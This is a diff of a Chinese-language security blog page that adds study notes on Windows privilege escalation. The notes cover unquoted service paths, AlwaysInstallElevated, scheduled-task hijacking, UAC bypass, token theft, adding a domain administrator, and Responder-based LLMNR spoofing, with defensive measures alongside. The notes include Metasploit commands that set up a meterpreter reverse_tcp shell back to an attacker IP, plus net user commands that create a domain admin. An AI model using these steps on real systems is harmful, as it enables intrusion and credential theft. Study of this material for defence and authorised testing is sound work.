@@ -39,7 +39,7 @@
 <meta property="og:image" content="https://kizureina.github.io/images/image-20240610220604143.png">
 <meta property="og:image" content="https://kizureina.github.io/images/image-20240610235011138.png">
 <meta property="article:published_time" content="2024-06-10T06:50:14.000Z">
-<meta property="article:modified_time" content="2024-06-10T16:21:44.338Z">
+<meta property="article:modified_time" content="2024-06-11T05:26:23.110Z">
 <meta property="article:author" content="Kizurena">
 <meta property="article:tag" content="Web Computer Science Anime Comic Galgame">
 <meta name="twitter:card" content="summary">
@@ -382,7 +382,7 @@
   
           </div>
           <div class="wordcount need-seperator meta-info">
-            8.1k 词 
+            11k 词 
           </div>
         </div>
         
@@ -1159,6 +1159,155 @@
 <li><p>Metasploit：利用service_permissions模块</p>
 </li>
 </ul>
+<h3 id="注册表键AlwaysInstallElevated"><a href="#注册表键AlwaysInstallElevated" class="headerlink" title="注册表键AlwaysInstallElevated"></a>注册表键AlwaysInstallElevated</h3><p>注册表键AlwaysInstallElevated是一个<em>策略设置项</em>。</p>
+<p>Windows允许低权限用户以System权限运行安装文件。</p>
+<p>如果启用此策略设置项，那么任何权限的用户都能以<code>NT AUTHORITY\SYSTEM</code>权限来安装恶意MSI文件</p>
+<h4 id="PathsAlwaysInstallElevated漏洞原理"><a href="#PathsAlwaysInstallElevated漏洞原理" class="headerlink" title="PathsAlwaysInstallElevated漏洞原理"></a>PathsAlwaysInstallElevated漏洞原理</h4><p>Windows Installer：Windows系统用于安装和管理软件的组件，当点击<code>.msi</code>后缀的文件时，会运行msiexec.exe读取文件中的数据和指令(.msi文件实际上是一个存储了安装数据和配置命令的数据库)进行安装操作。</p>
+<p>当用户开启了Windows Installer特权安装功能时，会自动创建注册表2个键值。</p>
+<p>此时允许用户以<strong>System权限</strong>安装文件运行.msi文件。</p>
+<h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><h4 id="TrustedServicePaths漏洞产生的原因"><a href="#TrustedServicePaths漏洞产生的原因" class="headerlink" title="TrustedServicePaths漏洞产生的原因"></a>TrustedServicePaths漏洞产生的原因</h4><p>因为Windows服务通常都是以System权限运行的，所以系统在解析服务所对应的文件路径中的<em>空格</em>时，也会以系统权限进行。</p>
+<p>例如，有一个文件路径<code>C:\Program(空格)Files\Some(空格)Folder\Service.exe</code>。对于该路径中的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序（Windows系统允许exe文件不写出后缀名，因此会对空格看作路径结束，寻找空格前的字符串对应的可执行文件）。</p>
+<p>操作系统会对文件路径中空格的所有可能情况进行尝试，直至找到一个能够匹配的程序。</p>
+<p>系统对可执行文件寻找的路径如下：</p>
+<p>■ C:\Program.exe </p>
+<p>■ C:\Program (空格) Files\Some.exe </p>
+<p>■ C:\Program (空格) Files\Some(空格)Folder\Service.exe</p>
+<p>因此可以构造一个exe文件实现劫持。</p>
+<h4 id="漏洞要求"><a href="#漏洞要求" class="headerlink" title="漏洞要求"></a>漏洞要求</h4><ul>
+<li>系统服务中路径保护空格</li>
+<li>系统服务中的路径未被引号包括（否则不会被空格截断）</li>
+<li>有对目标文件夹的写操作权限</li>
+</ul>
+<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><p>使用wmic寻找符合条件的服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic service get</span><br><span class="line">name,displayname,pathname,startmode | findstr/i<span class="string">&quot;Auto&quot;</span> | findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span> | findstr/i /v<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再用系统内置icacls检测文件夹权限即可实现利用。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>当构造好对应的exe后，执行以下命令重启服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure>
+
+<p>也可以用msf:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/trusted_service_pathset payload windows/meterpreter/reverse_tcpset session 1</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.99.22</span><br><span class="line"><span class="built_in">set</span> lport 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>最后迁移进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> AutoRunScript migrage -f</span><br></pre></td></tr></table></figure>
+
+<h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><p>网络管理员在内网中给多台机器配置同一个环境时，通常不会逐台配置，而会使用脚本化批量部署的方法。在这一过程中，会使用<strong>安装配置文件</strong>。这些文件中包含所有的安装配置信息，其中的一些还可能包含本地管理员账号和密码等信息。</p>
+<p>可以直接搜索这些文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /b /s c:\Unattend.xml</span><br></pre></td></tr></table></figure>
+
+<p>也可以用msf的集成模块<code>post/windows/gather/enum_unattend</code>.</p>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>查看计划任务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>
+
+<p>再使用官方工具<code>AccessChk</code>查看对应计划任务的目录权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk -dqv <span class="string">&quot;C:\Microsoft&quot;</span> -accepteula</span><br><span class="line"><span class="comment"># /accepteula是自动接受许可协议</span></span><br></pre></td></tr></table></figure>
+
+<p>如果攻击者对以高权限运行的任务所在的目录具有<em>写权限</em>，就可以使用恶意程序覆盖原来的程序。</p>
+<p>这样，在计划任务下次执行时，就会以高权限来运行恶意程序。</p>
+<h2 id="组策略首选项提权分析及防范"><a href="#组策略首选项提权分析及防范" class="headerlink" title="组策略首选项提权分析及防范"></a>组策略首选项提权分析及防范</h2><p>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在<strong>域中的所有域控制器</strong>之间进行复制。</p>
+<p>SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。</p>
+<p>整个SYSVOL目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在<code>C:\Windows\SYSVOL\DOMAIN\Policies\</code>目录中。</p>
+<p>常见的组策略首选项（GroupPolicyPreferences,GPP)：</p>
+<ul>
+<li>映射驱动器（Drives.xml) </li>
+<li>创建本地用户。</li>
+<li>数据源（DataSources.xml) </li>
+<li>打印机配置（Printers.xml) </li>
+<li>创建&#x2F;更新服务（Services.xml) </li>
+<li>计划任务（ScheduledTasks.xml）</li>
+</ul>
+<p>可以通过更改组策略实现提权：</p>
+<ol>
+<li>手动查找</li>
+<li>使用powershell获取</li>
+<li>使用MSF查找</li>
+<li>使用Empire查找</li>
+</ol>
+<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><p>■ 在用于管理组策略的计算机上安装<strong>KB2962486</strong>补丁</p>
+<p>■ 此外，需要对<strong>Everyone</strong>访问权限进行设置，具体如下:</p>
+<ul>
+<li>设置共享文件夹SYSVOL的访问权限。 </li>
+<li>将包含组策略密码的XML文件从SYSVOL目录中删除。</li>
+<li>不要把密码放在所有域用户都有权访问的文件中。</li>
+<li>如果需要更改域中机器的本地管理员密码，建议使用LAPS。</li>
+</ul>
+<h2 id="绕过UAC提权分析及防范"><a href="#绕过UAC提权分析及防范" class="headerlink" title="绕过UAC提权分析及防范"></a>绕过UAC提权分析及防范</h2><p><em>UAC</em>(UserAccountControl,用户账户控制）是微软为提高系统安全性在Windows Vista中引入的技术。</p>
+<p>UAC要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。</p>
+<p>需要UAC的授权才能进行的操作如下：</p>
+<ul>
+<li>配置Windows Update。</li>
+<li>增加&#x2F;删除账户。 </li>
+<li>更改账户类型。 </li>
+<li>更改UAC的设置。 </li>
+<li>安装ActiveX。 </li>
+<li>安装&#x2F;卸载程序。 </li>
+<li>安装设备驱动程序。 </li>
+<li>将文件移动&#x2F;复制到ProgramFiles或Windows目录下。</li>
+<li>査看其他用户的文件夹</li>
+</ul>
+<p>UAC有如下四种设置要求。</p>
+<p>■ <strong>始终通知</strong>：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户。</p>
+<p>■ <strong>仅在程序试图更改我的计算机时通知我</strong>：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户。 </p>
+<p>■ 仅在程序试图更改我的计算机时通知我（不降低桌面的亮度）：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度。 </p>
+<p>■ <strong>从不提示</strong>：当用户为系统管理员时，所有程序都会以最高权限运行。</p>
+<h3 id="使用MSF的bypassuac模块"><a href="#使用MSF的bypassuac模块" class="headerlink" title="使用MSF的bypassuac模块"></a>使用MSF的bypassuac模块</h3><p>已经获得了目标机器的meterpreter Shell。</p>
+<p>当前权限为普通用户权限，现在尝试获取系统的System权限：</p>
+<p>■ 首先，运行exploit&#x2F;windows&#x2F;local&#x2F;bypassuac模块，获得一个新的meterpreter Shell。</p>
+<p>■ 然后，执行<code>getsystem</code>命令。再次査看权限，发现已经绕过UAC，获得了System权限，</p>
+<h3 id="RunAs模块"><a href="#RunAs模块" class="headerlink" title="RunAs模块"></a>RunAs模块</h3><p>使用MSF的exploit&#x2F;windows&#x2F;local&#x2F;ask模块，创建一个可执行文件，目标机器会运行一个发起提升权限请求的程序，提示用户是否要继续运行;</p>
+<p>如果用户选择继续运行程序，就会返回一个高权限的meterpreter Shell。</p>
+<h3 id="Nishang中的Invoke-PsUACme模块"><a href="#Nishang中的Invoke-PsUACme模块" class="headerlink" title="Nishang中的Invoke-PsUACme模块"></a>Nishang中的Invoke-PsUACme模块</h3><p>Invoke-PsUACme模块使用来自UACME项目的DLL绕过UAC。</p>
+<h3 id="针对绕过UAC提权的防御措施"><a href="#针对绕过UAC提权的防御措施" class="headerlink" title="针对绕过UAC提权的防御措施"></a>针对绕过UAC提权的防御措施</h3><blockquote>
+<p>■ 在企业网络环境中，不让内网机器的使用者拥有本地管理员权限，从而降低系统遭受攻击的可能性。</p>
+<p>■ 在家庭网络环境中，建议使用非管理员权限进行日常办公和娱乐等活动。</p>
+<p>■ 使用本地管理员权限登录的用户，要将UAC设置为“始终通知”或者删除该用户的本地管理员权限。</p>
+<p>■ 可以使用微软的EMET或MalwareBytes来更好地防范0day漏洞。</p>
+</blockquote>
+<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><p>令牌(Token)是指系统中的<em>临时密钥</em>，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。</p>
+<p>■ 令牌的最大特点是<strong>随机性和不可预测性</strong>。一般的攻击者或软件都无法将令牌猜测出来。</p>
+<p>■ 访问令牌（Access Token)代表访问<strong>控制操作主体的系统对象</strong></p>
+<p>■ 密保令牌（Security Token)也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</p>
+<p>■ 会话令牌（Session Token)是<strong>交互会话</strong>中唯一的身份标识符。</p>
+<p>■ 伪造令牌攻击的核心是<em>Kerberos协议</em>。</p>
+<h3 id="Kerberos协议验证流程"><a href="#Kerberos协议验证流程" class="headerlink" title="Kerberos协议验证流程"></a>Kerberos协议验证流程</h3><ol>
+<li>用户输入自己的账号密码登录活动目录 </li>
+<li>域控制器对账号密码进行验证 </li>
+<li>密钥分发中心（KDC）将服务授权的票据（TGT）发送给用户，作为访问资源时的身份凭据 </li>
+<li>访问某个服务时，用户再次与KDC通信，将TGT作为身份凭证和对应的服务主体名称（SPN）一同 发送给KDC </li>
+<li>KDC中的身份验证服务（AS）对TGT进行解密 </li>
+<li>验证通过后，票据授权服务器（TGS）,将允许访问对应服务的票据以及服务的地址发送给用户 </li>
+<li>用户使用该票据即可访问对应服务</li>
+</ol>
+<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p>在获得meterpreter Shell之后，可以伪造令牌，进行交互或非交互的会话（两种操作需要的令牌不同）</p>
+<h3 id="RottenPotato本地提权分析"><a href="#RottenPotato本地提权分析" class="headerlink" title="RottenPotato本地提权分析"></a>RottenPotato本地提权分析</h3><p>如果目标系统中存在有效的令牌，可以通过RottenPotato程序快速模拟用户令牌来实现权限 </p>
+<p>■ 输入“use incognito” 、“list tokens -u”命令，列出可用的令牌。</p>
+<p>■ 下载<code>RottenPotato execute -HC -f rottenpotato.exe impersonate_token &quot;NT AUTHORITYW\\SYSTEM&quot;</code></p>
+<h3 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h3><p>假设网络中设置了<em>域管理进程</em>。在meterpreter会话窗口中输入“ps”命令，查看系统进程。</p>
+<p>找到域管理进程，并使用migrate命令迁移到该进程。</p>
+<p>在meterpreter控制台中输入“shell”，进入命令行界面，此时可以添加域管理员提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user 11 Aa123456 /ad /domain</span><br><span class="line"><span class="comment"># 把用户添加到域管理员组中</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> 11 /ad/domain</span><br><span class="line"><span class="comment"># 査看域管理员组</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<h3 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h3><p>■ 及时安装微软推送的补丁。</p>
+<p>■ 对来路不明的或者有危险的软件，既不要在系统中使用，也不要在虚拟机中使用。</p>
+<p>■ 对令牌的<em>时效性</em>进行限制，以防止散列值被破解后泄露有效的令牌信息。越敏感的数据，其令牌时效应该越短。如果每个操作都使用独立的令牌，就可以比较容易地定位泄露令牌的操作或环节。</p>
+<p>■ 对于令牌，应采取加密存储及多重验证保护。</p>
+<p>■ 使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听。</p>
+<h2 id="无凭证条件下的权限获取提权分析及防范"><a href="#无凭证条件下的权限获取提权分析及防范" class="headerlink" title="无凭证条件下的权限获取提权分析及防范"></a>无凭证条件下的权限获取提权分析及防范</h2><p>假设已经进入目标网络，但没有获得任何凭证，使用LLMNR和NetBIOS欺骗攻击对目标网络进行渗透测试。</p>
+<h3 id="LLMNR和NetBIOS欺骗攻击"><a href="#LLMNR和NetBIOS欺骗攻击" class="headerlink" title="LLMNR和NetBIOS欺骗攻击"></a>LLMNR和NetBIOS欺骗攻击</h3><h4 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h4><p>本地链路多播名称解析（LLMNR)是一种域名系统数据包格式。当局域网中的DNS服务器不可用时，DNS客户端会使用<em>LLMNR解析本地网段中机器的名称</em>，直到DNS服务器恢复正常为止。</p>
+<p>Windows从vista版本开始支持LLMNR，支持IPv6</p>
+<h4 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h4><p>NetBIOS是一种网络协议，根据NetBIOS协议<em>广播获得计算机名称</em>，并将其解析为相应的IP地址。</p>
+<p>NetBIOS不支持IPv6。</p>
+<p>NetBIOS提供的三种服务如下：</p>
+<p>■ NetBIOS-NS(<strong>名称服务</strong>）：主要用于名称注册和解析，以启动会话和分发数据报。默认监听UDP137端口，也可以使用TCP137端口。</p>
+<p>■ Datagram Distribution Service(数据报分发服务）：无连接服务。该服务负责进行错误检测和恢复，默认监听UDP138端口。</p>
+<p>■ Session Service(会话服务）：允许两台计算机建立连接，允许电子邮件跨越多个数据包进行传输，提供错误检测和恢复机制。默认使用TCP139端口。</p>
+<h4 id="Net-NTLM-Hash和NTLM-Hash的区别"><a href="#Net-NTLM-Hash和NTLM-Hash的区别" class="headerlink" title="Net-NTLM-Hash和NTLM-Hash的区别"></a>Net-NTLM-Hash和NTLM-Hash的区别</h4><p>NTLM Hash是指Windows操作系统的SecurityAccount Manager中保存的<em>用户密码散列值</em>。通常保存在Windows的SAM文件或者NTDS.DIT数据库中，用于对访问资源的用户进行身份验证。 </p>
+<p>Net-NTLM Hash是指在<em>网络环境中经过NTLM认证</em>的散列值。挑战&#x2F;响应验证中的“响应”就包含Net-NTLMHash。使用Responder抓取的通常就是Net-NTLMHash。</p>
+<p>攻击者无法使用Net-NTLM Hash散列值进行哈希传递攻击，只能在使用Hashcat等工具得到明文后进行横向移动攻击。</p>
+<h3 id="具体攻击"><a href="#具体攻击" class="headerlink" title="具体攻击"></a>具体攻击</h3><p>假设目标网络的DNS服务器因发生故障而无法提供服务时，会退回LLMNR和NBT-NS进行计算机名解析。</p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder.git"><code>Responder</code>工具</a>进行渗透测试。</p>
+<p>在渗透测试中，使用Responder并启动回应请求功能：Responder会自动回应客户端的请求并声明<em>自己就是被输入了错误计算机名的那台机器</em>，然后尝试建立SMB连接。</p>
+<p>客户端会发送自己的<em>Net-NTLMHash进行身份验证</em>，此时将得到目标机器的Net-NTLMHash。</p>
 
         
       </div>
